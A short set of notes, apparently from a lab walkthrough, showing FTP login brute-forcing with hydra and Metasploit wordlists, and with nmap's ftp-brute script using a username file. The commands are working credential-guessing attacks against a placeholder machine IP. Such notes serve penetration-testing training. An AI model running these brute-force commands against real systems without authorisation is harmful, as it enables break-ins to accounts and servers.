
### Using `hydra`
```
hydra -L <user_wordlist> -P <pass_wordlist> <Machine_IP> ftp
```


- **Username word-list path:**
```
/usr/share/metasploit-framework/data/wordlists/common_users.txt
```

- **Password word-list path:**
```
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Using `nmap`

- First, put the username found in a single word-list:
```
echo "sysadmin" > users
```

- Use NMAP:
```
nmap <Machine-IP> --script ftp-brute --script-args userdb=/root/users -p 21
```
*We need to provide the username wordlist we created in arg userdb.*

